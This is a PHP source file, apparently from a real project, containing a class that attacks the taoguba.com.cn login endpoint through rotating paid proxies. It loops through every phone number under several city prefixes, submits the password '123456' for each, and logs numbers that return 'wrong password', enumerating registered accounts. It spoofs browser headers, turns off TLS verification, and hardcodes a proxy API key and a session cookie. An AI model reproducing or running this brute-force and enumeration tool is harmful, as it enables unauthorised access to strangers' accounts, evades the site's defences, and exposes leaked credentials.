<?php
/**
 * Created by PhpStorm.
 * User: b_tt
 * Date: 19/1/28
 * Time: 10:37
 */

namespace common\utils;


use common\models\Log;

class TryPhone
{
	const APP_KEY = 'af295cc800a749b5bc66ddd07952cfee';
//	const URL_GET_IPS = 'http://piping.mogumiao.com/proxy/api/get_ip_bs?appKey=405b848e01284a42a1b2152b48973894&count=10&expiryDate=0&format=1&newLine=2';
	const URL_GET_IPS = 'http://piping.mogumiao.com/proxy/api/get_ip_bs?appKey=af295cc800a749b5bc66ddd07952cfee&count=10&expiryDate=0&format=1&newLine=2';

	const URL_TAOGUBA_LOGIN = 'https://sso.taoguba.com.cn/web/login/submit';

	const LOCAL_IP = '139.199.31.56';
	const COOKIE = 'Hm_lvt_cc6a63a887a7d811c92b7cc41c441837=1548320523; UM_distinctid=1687f18470f485-00955950e23854-10346656-fa000-1687f184711b32; CNZZDATA1574657=cnzz_eid%3D2073132248-1548319611-https%253A%252F%252Fwww.taoguba.com.cn%252F%26ntime%3D1548319611; JSESSIONID=d82ef175-fd60-46a4-9c4d-494d410475ef; Hm_lpvt_cc6a63a887a7d811c92b7cc41c441837=1548320768';

	/**
	 * 原文：https://blog.csdn.net/u013091013/article/details/81312559
	 */
	public static function updateIPs()
	{
		$link = self::URL_GET_IPS;
		$ret = AppUtil::httpGet($link);
		$ret = json_decode($ret, 1);
		print_r($ret);
		$ip_port = [];
		if (is_array($ret) && $ret['code'] == 0) {
			foreach ($ret['msg'] as $v) {
				$ip_port[] = $v['ip'] . ":" . $v['port'];
			}
		}

		RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->setCache($ip_port);

	}

	public static function get_proxy()
	{
		$ret = RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->getCache();
		$ret = json_decode($ret, 1);
		if (is_array($ret)) {
			shuffle($ret);
			return $ret[0];
		}
		return "";
	}

	public static function logFile($msg, $funcName = '', $line = '', $filename = "try_phone")
	{
		if (is_array($msg)) {
			$msg = json_encode($msg, JSON_UNESCAPED_UNICODE);
		}
		if ($funcName) {
			$msg = $funcName . ' ' . $line . ': ' . $msg;
		} else {
			$msg = 'message: ' . $msg;
		}
		$fileName = AppUtil::logDir() . 'phone_' . $filename . date('Ymd') . '.log';
		@file_put_contents($fileName, date('Y-m-d H:i:s') . ' ' . $msg . PHP_EOL, FILE_APPEND);
	}


	public static function taoguba_phone($data)
	{
		$ip_port = self::get_proxy();
		self::logFile('$ip_port=>' . $ip_port, __FUNCTION__, __LINE__);
		if (!$ip_port) {
			return false;
		}
		$arrip = explode(":", $ip_port);
		$appKey = "Basic" . self::APP_KEY;

		$link = self::URL_TAOGUBA_LOGIN;

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $link);//设置链接
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
		curl_setopt($ch, CURLOPT_PROXY, $arrip[0]); //代理服务器地址
		curl_setopt($ch, CURLOPT_PROXYPORT, $arrip[1]); //代理服务器端口
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

		curl_setopt($ch, CURLOPT_TIMEOUT, 30);//设置超时时间
		curl_setopt($ch, CURLOPT_COOKIE, self::COOKIE);

		curl_setopt($ch, CURLOPT_POST, 1);
		$postdata = "";
		foreach ($data as $key => $value) {
			$postdata .= ($key . '=' . $value . '&');
		}
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_HTTPHEADER,
			[
				'Accept:*/*',
				'accept-encoding: gzip, deflate, br',
				'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
				'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
				'Content-Length: ' . strlen($postdata),
				"Proxy-Authorization: {$appKey}",
				"User-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.1.0.13",
				'origin: https://sso.taoguba.com.cn',
				'Referer: https://sso.taoguba.com.cn/xdomainProxy.html',
				'X-Requested-With: XMLHttpRequest',
			]);

		$response = curl_exec($ch);
		self::logFile($response, __FUNCTION__, __LINE__);
		if ($response === false) {
			$error_info = curl_error($ch);
			curl_close($ch);// 关闭curl
			return false;
		} else {
			curl_close($ch);//关闭 curl
			return $response;
		}
	}

	// bj
	public static function phone_section_1()
	{
		$phone_section = [
			1391083,
			1371648,
			1819342,
			1827717,
			1571282,
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	// tianjin
	public static function phone_section_2()
	{
		$phone_section = [
			1351200,
			1350218,
			1350214,
			1350212,
			1862211,
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	// shanghai
	public static function phone_section_3()
	{
		$phone_section = [
			1364174,
			1378898,
			1831708,
			1381622,
			1502116,
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	public static function phone_section_4()
	{

		while (1) {
			$log = Log::findOne(['oCategory' => Log::CAT_PHONE_SECTION, 'oKey' => Log::KEY_WAIT]);
			if ($log) {
				$p = $log->oOpenId;
				echo $p . PHP_EOL;
				$log->oKey = Log::KEY_USED;
				$log->oAfter = 1;
				$log->save();
//				 self::combind_phone($p);
			} else {
				break;
			}
		}
		echo 'end ' . __FUNCTION__ . PHP_EOL;

	}

	public static function combind_phone($p)
	{
		for ($i = 0; $i < 9999; $i++) {
			$phone = $p * 10000 + $i;
			self::req($phone);
		}
	}

	public static function req($phone)
	{
		$data = [
			'userName' => $phone,
			'password' => "123456",
			'save' => "Y",
			'url' => "https://www.taoguba.com.cn/index?blockID=1",
		];
		$ret = TryPhone::taoguba_phone($data);
		// echo $phone . ' ===== ' . $ret . PHP_EOL;
		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs');
		if ($ret) {
			$ret = json_decode($ret, 1);
			if (isset($ret['errorMessage']) && $ret['errorMessage'] == "密码错误") {
				self::logFile(['phone' => $phone], __FUNCTION__, __LINE__, 'yes');
			}
		}

	}
}